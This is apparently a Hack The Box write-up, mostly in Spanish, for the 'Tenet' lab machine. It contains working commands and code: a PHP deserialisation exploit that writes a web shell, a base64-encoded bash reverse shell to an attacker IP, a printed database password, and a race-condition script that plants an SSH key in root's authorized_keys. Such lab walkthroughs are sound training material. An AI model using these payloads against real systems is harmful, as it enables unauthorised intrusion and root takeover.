---
layout: single
title: Tenet - Hack The Box
excerpt: "Tenet is a Medium difficulty machine that features an Apache web server. It contains a Wordpress blog with a few posts. One of the comments on the blog mentions the presence of a PHP file along with it&amp;#039;s backup. It is possible after identificaiton of the backup file to review it&amp;#039;s source code. The code in PHP file is vulnerable to an insecure deserialisation vulnerability and by successful exploiting it a foothold on the system is achieved. While enumerating the system it was found that the Wordpress configuration file can be read and thus gaining access to a set of credentials. By using them we can move laterally from user 'www-data' to user 'Neil'. Further system enumeration reveals that this user have root permissions to run a bash script through 'sudo'. The script is writing SSH public keys to the 'authorized_keys' file of the 'root' user and is vulnerable to a race condition. After successful exploitation, attackers can write their own SSH keys to the 'authorized_keys' file and use them to login to the system as 'root'."
date: 2025-06-28
classes: wide
header:
  teaser: /img2/tenet.png
  teaser_home_page: true
  icon: /img2/images/hackthebox.webp
categories:
  - hackthebox
  - Linux
  - Medium
tags:
  - PHP Deserialization Attack
  - Abusing Race Condition
---


## Reconnaissance

- Nmap

```bash
❯ nmap -sS --open -p- --min-rate 5000 -n -Pn 10.10.10.223
```

```ruby
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-28 16:04 CEST
Nmap scan report for 10.10.10.223
Host is up (0.039s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 11.08 seconds
```

- Add domain to /etc/hosts

```bash
❯ echo "10.10.10.223 tenet.htb" >> /etc/hosts
```

 - Fuzzing backup file

![](/img2/Pasted%20image%2020250628195744.png)

> Dentro de un post encontramos un comentario de neil, en este comentario encontramos un posible backup del script sator.php.

![](/img2/Pasted%20image%2020250628195918.png)

> El archivo sator.php se encuentra fuera del virtual hosting, sabiendo esto podemos comenzar con el fuzzing de extensiones.

```bash
❯ wfuzz -c --hc=404 -z list,backup-bak-txt-tar-tar.gz-bk-bck-old http://10.10.10.223/sator.php.FUZZ
```

```ruby
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.223/sator.php.FUZZ
Total requests: 8

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                    
=====================================================================

000000002:   200        31 L     70 W       514 Ch      "bak"       
```

```bash
❯ curl -o sator.php.bak http://10.10.10.223/sator.php.bak
```

```
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   514  100   514    0     0   7833      0 --:--:-- --:--:-- --:--:--  7907
```

```bash
❯ cat sator.php.bak
```

```php
<?php

class DatabaseExport
{
	public $user_file = 'users.txt';
	public $data = '';

	public function update_db()
	{
		echo '[+] Grabbing users from text file <br>';
		$this-> data = 'Success';
	}


	public function __destruct()
	{
		file_put_contents(__DIR__ . '/' . $this ->user_file, $this->data);
		echo '[] Database updated <br>';
	//	echo 'Gotta get this working properly...';
	}
}

$input = $_GET['arepo'] ?? '';
$databaseupdate = unserialize($input);

$app = new DatabaseExport;
$app -> update_db();


?>
```

## Exploitation

- Deserialization attack

```bash
❯ php -a
```

```php
Interactive shell

php > file_put_contents(__DIR__ . '/' . "test", "testing");
```

```bash                                                                            
❯ cat test
```

```ruby
testing   
```

> Antes de nada vamos a desglosar el código. Primero el script pide un párametro 'arepo', el cual lo deserializa. Viendo esto podemos probar a ejecutar alguna función del script, como la función destruct(). La función destruct() permite crear archivos con el contenido y el nombre que queramos en el directorio actual.

```php
<?php

class DatabaseExport{

	public $user_file= "cmd.php";
	public $data= "<?php system('whoami');?>";

}
echo urlencode(serialize(new DatabaseExport))

?>
```

```bash
❯ php exploit.php
```

```ruby
O%3A14%3A%22DatabaseExport%22%3A2%3A%7Bs%3A9%3A%22user_file%22%3Bs%3A7%3A%22cmd.php%22%3Bs%3A4%3A%22data%22%3Bs%3A25%3A%22%3C%3Fphp+system%28%27whoami%27%29%3B%3F%3E%22%3B%7D
```

> Para crear el objeto deserializado, creamos un script en php que crea una clase DatabaseExport, la cual serializa dos parametros: 
> 1. user_file: nombre del archivo
> 2. data: contenido del archivo

![](/img2/Pasted%20image%2020250628214204.png)

![](/img2/Pasted%20image%2020250628214234.png)

- Reverse Shell

```bash
❯ echo "bash -c 'bash -i >& /dev/tcp/10.10.14.5/9000 0>&1'" | base64
```

```ruby
YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41LzkwMDAgMD4mMScK
```

```php
<?php

class DatabaseExport{

	public $user_file= "test.php";
	public $data= "<?php system('echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41LzkwMDAgMD4mMScK| base64 -d |bash');?>";

}

echo urlencode(serialize(new DatabaseExport))

?>
```

```bash
❯ php exploit.php
```

```ruby
O%3A14%3A%22DatabaseExport%22%3A2%3A%7Bs%3A9%3A%22user_file%22%3Bs%3A8%3A%22test.php%22%3Bs%3A4%3A%22data%22%3Bs%3A109%3A%22%3C%3Fphp+system%28%27echo+YmFzaCAtYyAnYmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC41LzkwMDAgMD4mMScK%7C+base64+-d+%7Cbash%27%29%3B%3F%3E%22%3B%7D
```

![](/img2/Pasted%20image%2020250628214853.png)

```bash
❯ curl http://10.10.10.223/test.php
```

```bash
❯ nc -nlvp 9000 
```

```ruby
listening on [any] 9000 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.10.223] 19458
bash: cannot set terminal process group (1739): Inappropriate ioctl for device
bash: no job control in this shell
www-data@tenet:/var/www/html$
```

## Post-exploitation

- Information Leakage

```bash
www-data@tenet:/var/www/html/wordpress$ cat wp-config.php | grep password -C2
```

```ruby
define( 'DB_USER', 'neil' );

/** MySQL database password */
define( 'DB_PASSWORD', 'Opera2112' );
```

> Credenciales encontradas: neil:Opera2112

- Pivoting

```bash
www-data@tenet:/var/www/html/wordpress$ su neil
```

```ruby
Password: 
neil@tenet:/var/www/html/wordpress$ 
```

- Find Sudoers

```bash
neil@tenet:/tmp$ sudo -l
```

```ruby
Matching Defaults entries for neil on tenet:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:

User neil may run the following commands on tenet:
    (ALL : ALL) NOPASSWD: /usr/local/bin/enableSSH.sh
```

- Race Condition

```bash
neil@tenet:~$ cat /usr/local/bin/enableSSH.sh
#!/bin/bash

checkAdded() {

	sshName=$(/bin/echo $key | /usr/bin/cut -d " " -f 3)

	if [[ ! -z $(/bin/grep $sshName /root/.ssh/authorized_keys) ]]; then

		/bin/echo "Successfully added $sshName to authorized_keys file!"

	else

		/bin/echo "Error in adding $sshName to authorized_keys file!"

	fi

}

checkFile() {

	if [[ ! -s $1 ]] || [[ ! -f $1 ]]; then

		/bin/echo "Error in creating key file!"

		if [[ -f $1 ]]; then /bin/rm $1; fi

		exit 1

	fi

}

addKey() {

	tmpName=$(mktemp -u /tmp/ssh-XXXXXXXX)

	(umask 110; touch $tmpName)

	/bin/echo $key >>$tmpName

	checkFile $tmpName

	/bin/cat $tmpName >>/root/.ssh/authorized_keys

	/bin/rm $tmpName

}

key="ssh-rsa AAAAA3NzaG1yc2GAAAAGAQAAAAAAAQG+AMU8OGdqbaPP/Ls7bXOa9jNlNzNOgXiQh6ih2WOhVgGjqr2449ZtsGvSruYibxN+MQLG59VkuLNU4NNiadGry0wT7zpALGg2Gl3A0bQnN13YkL3AA8TlU/ypAuocPVZWOVmNjGlftZG9AP656hL+c9RfqvNLVcvvQvhNNbAvzaGR2XOVOVfxt+AmVLGTlSqgRXi6/NyqdzG5Nkn9L/GZGa9hcwM8+4nT43N6N31lNhx4NeGabNx33b25lqermjA+RGWMvGN8siaGskvgaSbuzaMGV9N8umLp6lNo5fqSpiGN8MQSNsXa3xXG+kplLn2W+pbzbgwTNN/w0p+Urjbl root@ubuntu"
addKey
checkAdded
```

> Al revisar el script vemos que está metiendo una clave pública al archivo /root/.ssh/authorized_keys. El error está en la forma de crear el archivo con la clave pública. El flujo del script es el siguiente:
> 
> 1. Crea un archivo temporal con el nombre ssh-(random).
> 2. Mete el contenido de la clave en el archivo temporal.
> 3. Llama a la función checkFile.
> 4. Mete el contenido del archivo temporal en el /root/.ssh/authorized_keys.
> 5. Borra el archivo.
> 6. Comprueba si la clave pública se ha añadido.

```bash
#!/bin/bash

if ls /tmp/ssh-* 2>/dev/null;then
	echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIUhYBjzvDmO/e8IRzDVe6ojCFE8JzONwO6eEP0MYQva root@pyuser" > /tmp/ssh-*
	rm ssh-\* 2>/dev/null
fi
```

> Nos creamos un script que detecta cuando se crea el archivo temporal y mete el contenido de nuestra clave pública en el archivo.

```bash
neil@tenet:/tmp$ while true;do ./exploit.sh;done
```

```ruby
/tmp/ssh-Git0x5BF
```

```bash
neil@tenet:/tmp$ while true; do sudo /usr/local/bin/enableSSH.sh; done
```

```ruby
Successfully added root@ubuntu to authorized_keys file!
```

> Ejecutamos los dos script en bucle a la misma vez.

```bash
❯ ssh root@10.10.10.223
```

```ruby
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-129-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Jun 28 20:46:03 UTC 2025

  System load:  0.9                Processes:             190
  Usage of /:   15.6% of 22.51GB   Users logged in:       1
  Memory usage: 20%                IP address for ens160: 10.10.10.223
  Swap usage:   0%


53 packages can be updated.
31 of these updates are security updates.
To see these additional updates run: apt list --upgradable

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sat Jun 28 20:32:01 2025 from 10.10.14.5
root@tenet:~# 
```


![](/img2/Pasted%20image%2020250628215607.png)